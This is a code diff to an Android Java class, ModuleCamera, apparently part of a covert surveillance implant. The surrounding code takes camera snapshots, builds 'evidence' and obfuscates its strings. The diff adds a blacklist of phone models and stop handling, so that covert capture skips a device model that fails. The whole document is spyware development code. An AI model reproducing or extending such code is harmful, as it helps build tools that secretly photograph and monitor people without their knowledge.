@@ -17,6 +17,7 @@ import android.os.Handler;
 import android.os.Looper;
 
 import com.android.dvci.Status;
+import com.android.dvci.ThreadBase;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.evidence.EvidenceBuilder;
@@ -41,6 +42,9 @@ public class ModuleCamera extends BaseInstantModule {
 	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$
 
 	int counter = 0;
+	private String[] backlistedPhones = {
+			M.e("LG-D405")
+	};
 
 	public static ModuleCamera self() {
 		return (ModuleCamera) ManagerModule.self().get(M.e("camera"));
@@ -59,7 +63,7 @@ public class ModuleCamera extends BaseInstantModule {
 
 		//boolean force = conf.getBoolean("force", false);
 		//face = conf.getBoolean("face", false);
-
+		clearStop();
 		return Status.self().haveCamera();
 	}
 
@@ -73,8 +77,18 @@ public class ModuleCamera extends BaseInstantModule {
 				}
 				return;
 			}*/
+
 			if(haveStops()){
 				return;
+			}
+			for ( String model: backlistedPhones) {
+				if (Build.MODEL.equalsIgnoreCase(model)) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (actualStart): Phone: " + Build.MODEL + " not supported");
+					}
+					addStop(Status.STOP_REASON_PHONE_MODEL);
+					return;
+				}
 			}
 			if(CameraSnapshot.self().getCamera_killed() <= CameraSnapshot.MAX_CAMERA_KILLS) {
 				snapshot();
